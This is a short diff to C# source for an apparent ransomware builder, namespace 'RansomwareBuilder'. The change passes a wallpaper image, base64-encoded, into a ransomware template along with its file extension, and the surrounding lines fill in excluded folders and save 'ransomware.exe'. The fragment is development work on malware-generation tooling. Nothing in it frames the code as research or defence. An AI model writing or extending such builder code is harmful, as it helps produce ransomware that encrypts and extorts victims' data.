@@ -855,10 +855,17 @@ namespace RansomwareBuilder
                 ReplaceString(template, "|EXCLUDE_FOLDERS|", txtExcludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"));
                 
                 if (!string.IsNullOrEmpty(wallpaperPath))
-                {
-                    string base64 = Convert.ToBase64String(File.ReadAllBytes(wallpaperPath));
-                    ReplaceString(template, "|WALLPAPER|", base64);
-                }
+{
+    string base64 = Convert.ToBase64String(File.ReadAllBytes(wallpaperPath));
+    ReplaceString(template, "|WALLPAPER|", base64);
+    
+    // 🔥 НОВОЕ: передаём расширение обоев
+    string ext = Path.GetExtension(wallpaperPath);
+    if (!string.IsNullOrEmpty(ext))
+    {
+        ReplaceString(template, "|WALLPAPER_EXT|", ext);
+    }
+}
                 
                 lblDetail.Text = "💾 Сохранение ransomware.exe...";
                 
